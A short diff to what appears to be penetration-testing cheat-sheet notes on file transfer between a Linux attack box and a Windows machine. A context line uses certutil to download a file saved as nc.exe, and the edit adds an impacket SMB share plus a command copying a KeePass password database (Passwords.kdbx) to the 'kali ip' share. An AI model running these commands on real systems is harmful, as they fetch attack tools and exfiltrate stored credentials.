@@ -131,11 +131,11 @@ certutil.exe -urlcache -split -f http://example.com/a.txt C:\Users\Public\nc.exe
 ```
 linux:
 mkdir tools folder
-impacket-smbserver smb(customized sharename) tools(share path)/ -smb2support
+impacket-smbserver test(customized sharename) tools(share path)/ -smb2support
 
 windows:
 net use \\linuxIP\sharename
-copy file \\linuxIP\sharename\filename
+copy Passwords.kdbx(windows filename) \\kali ip\sharename\Passwords.kdbx
 ```
 ### Http
 ```
